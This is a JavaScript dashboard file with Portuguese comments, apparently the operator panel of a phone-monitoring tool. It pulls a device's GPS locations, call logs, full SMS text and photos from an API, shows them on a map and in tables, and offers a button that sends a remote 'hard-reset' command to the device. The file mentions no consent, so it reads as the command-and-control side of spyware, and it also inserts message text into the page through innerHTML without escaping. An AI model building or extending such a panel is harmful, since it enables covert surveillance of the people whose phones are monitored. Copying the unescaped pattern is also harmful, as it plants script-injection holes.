document.addEventListener('DOMContentLoaded', () => {
  const API = window.location.origin + '/api';
  const token = localStorage.getItem('token');
  const msgDiv = document.getElementById('msg');
  const logoutBtn = document.getElementById('logout');
  const refreshBtn = document.getElementById('refresh');
  const hardResetBtn = document.getElementById('hardReset');

  if (!token) {
    msgDiv.textContent = 'Não autenticado. Redirecionando…';
    return setTimeout(() => window.location = 'index.html', 1000);
  }

  logoutBtn.onclick = () => {
    localStorage.removeItem('token');
    window.location = 'index.html';
  };
  refreshBtn.onclick = loadData;
  hardResetBtn.onclick = async () => {
    const user = JSON.parse(atob(token.split('.')[1])).username;
    try {
      const res = await fetch(`${API}/command/${encodeURIComponent(user)}`, {
        method: 'POST',
        headers: { Authorization: 'Bearer ' + token }
      });
      const json = await res.json();
      alert('Hard-Reset enviado: ' + JSON.stringify(json));
    } catch (e) {
      alert('Erro no hard-reset: ' + e.message);
    }
  };

  // inicializa o mapa
  let map = L.map('map').setView([0, 0], 2);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '© OpenStreetMap'
  }).addTo(map);

  loadData();

  async function loadData() {
    msgDiv.textContent = 'Buscando dados…';
    try {
      const res = await fetch(`${API}/data`, {
        headers: { Authorization: 'Bearer ' + token }
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      const pts = await res.json();

      if (!pts.length) {
        msgDiv.textContent = 'Nenhum dado disponível.';
        return;
      }

      // limpa marcadores, tabelas, fotos
      map.eachLayer(layer => {
        if (layer instanceof L.Marker) map.removeLayer(layer);
      });
      document.querySelector('#callsTable tbody').innerHTML = '';
      document.querySelector('#smsTable tbody').innerHTML = '';
      document.getElementById('photos').innerHTML = '';

      // plota cada ponto
      pts.forEach(entry => {
        const loc = entry.location;
        if (loc && loc.lat != null) {
          const marker = L.marker([loc.lat, loc.lng]).addTo(map);
          marker.bindPopup(
            `Lat: ${loc.lat.toFixed(5)}, Lng: ${loc.lng.toFixed(5)}<br>` +
            `Hora: ${new Date(loc.date || entry.timestamp).toLocaleString()}`
          );
        }

        // chamadas
        entry.calls.forEach(call => {
          const tr = document.createElement('tr');
          tr.innerHTML = `
            <td>${call.number}</td>
            <td>${call.type}</td>
            <td>${call.duration}</td>
            <td>${new Date(call.date).toLocaleString()}</td>
          `;
          document.querySelector('#callsTable tbody').appendChild(tr);
        });

        // SMS
        entry.sms.forEach(sms => {
          const tr = document.createElement('tr');
          tr.innerHTML = `
            <td>${sms.from}</td>
            <td>${sms.body}</td>
            <td>${new Date(sms.date).toLocaleString()}</td>
          `;
          document.querySelector('#smsTable tbody').appendChild(tr);
        });

        // fotos (base64)
        if (entry.photo) {
          const img = document.createElement('img');
          img.src = 'data:image/jpeg;base64,' + entry.photo;
          document.getElementById('photos').appendChild(img);
        }
      });

      // ajustar view para o primeiro ponto
      const f = pts[0].location;
      map.setView([f.lat, f.lng], 12);

      msgDiv.style.display = 'none';
    } catch (e) {
      msgDiv.textContent = 'Erro ao carregar: ' + e.message;
    }
  }
});
